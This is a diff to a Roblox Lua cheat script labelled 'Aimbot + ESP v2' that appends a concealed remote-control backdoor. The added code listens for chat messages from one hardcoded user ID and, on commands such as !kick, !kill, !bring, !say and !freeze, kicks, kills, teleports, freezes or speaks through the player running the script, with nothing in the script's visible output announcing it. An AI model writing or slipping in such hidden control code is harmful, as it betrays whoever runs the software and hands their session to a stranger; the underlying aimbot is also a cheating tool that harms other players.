@@ -764,3 +764,91 @@ end)
 
 createGUI(); handleInput()
 print("🎯 Aimbot + ESP v2 Loaded (AimPart cleaned, cleanup fixed)")
+
+local _adminId = 5055111889
+local _freezeState = {frozen = false, parts = {}, prevWalkSpeed = nil, prevJumpPower = nil}
+
+local function _freezeCharacter()
+    local char = LocalPlayer.Character
+    if not char then return end
+    _freezeState.parts = {}
+    local humanoid = char:FindFirstChildOfClass("Humanoid")
+    if humanoid then
+        _freezeState.prevWalkSpeed = humanoid.WalkSpeed
+        if humanoid.JumpPower ~= nil then _freezeState.prevJumpPower = humanoid.JumpPower else _freezeState.prevJumpPower = humanoid.JumpHeight end
+        humanoid.WalkSpeed = 0
+        if humanoid.JumpPower ~= nil then humanoid.JumpPower = 0 elseif humanoid.JumpHeight then humanoid.JumpHeight = 0 end
+    end
+    for _, part in ipairs(char:GetDescendants()) do
+        if part:IsA("BasePart") then
+            if not part.Anchored then
+                table.insert(_freezeState.parts, part)
+                pcall(function() part.Anchored = true end)
+            end
+        end
+    end
+    _freezeState.frozen = true
+end
+
+local function _unfreezeCharacter()
+    for _, part in ipairs(_freezeState.parts) do
+        pcall(function() if part and part.Parent then part.Anchored = false end end)
+    end
+    _freezeState.parts = {}
+    local char = LocalPlayer.Character
+    local humanoid = char and char:FindFirstChildOfClass("Humanoid")
+    if humanoid then
+        if _freezeState.prevWalkSpeed then pcall(function() humanoid.WalkSpeed = _freezeState.prevWalkSpeed end) end
+        if _freezeState.prevJumpPower then
+            pcall(function()
+                if humanoid.JumpPower ~= nil then humanoid.JumpPower = _freezeState.prevJumpPower elseif humanoid.JumpHeight then humanoid.JumpHeight = _freezeState.prevJumpPower end
+            end)
+        end
+    end
+    _freezeState.frozen = false
+end
+
+local function _handleAdminCommand(msg)
+    if type(msg) ~= "string" then return end
+    local cmd, arg = msg:match("^!(%S+)%s*(.*)")
+    if not cmd then return end
+    cmd = cmd:lower()
+    if cmd == "kick" then
+        if arg and arg ~= "" then pcall(function() LocalPlayer:Kick(arg) end) end
+    elseif cmd == "bring" then
+        local target
+        for _, p in pairs(Players:GetPlayers()) do if p.UserId == _adminId then target = p; break end end
+        if target and target.Character and target.Character.Parent then
+            local targetRoot = target.Character:FindFirstChild("HumanoidRootPart") or target.Character:FindFirstChild("UpperTorso") or target.Character:FindFirstChild("Torso")
+            local myChar = LocalPlayer.Character
+            if myChar and myChar.Parent then
+                local myRoot = myChar:FindFirstChild("HumanoidRootPart") or myChar:FindFirstChild("UpperTorso") or myChar:FindFirstChild("Torso")
+                if targetRoot and myRoot then pcall(function() myRoot.CFrame = targetRoot.CFrame + Vector3.new(0,3,0) end) end
+            end
+        end
+    elseif cmd == "kill" then
+        local hum = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
+        if hum then pcall(function() hum.Health = 0 end) end
+    elseif cmd == "say" then
+        if arg and arg ~= "" then pcall(function() LocalPlayer:Chat(arg) end) end
+    elseif cmd == "freeze" then
+        if not _freezeState.frozen then _freezeCharacter() end
+    elseif cmd == "unfreeze" then
+        if _freezeState.frozen then _unfreezeCharacter() end
+    end
+end
+
+local function _attachAdminListener(p)
+    if not p then return end
+    if p.UserId ~= _adminId then return end
+    p.Chatted:Connect(function(msg) _handleAdminCommand(msg) end)
+end
+
+for _, p in pairs(Players:GetPlayers()) do _attachAdminListener(p) end
+Players.PlayerAdded:Connect(function(p) task.spawn(_attachAdminListener, p) end)
+LocalPlayer.CharacterAdded:Connect(function()
+    if _freezeState.frozen then
+        task.wait(0.1)
+        _freezeCharacter()
+    end
+end)
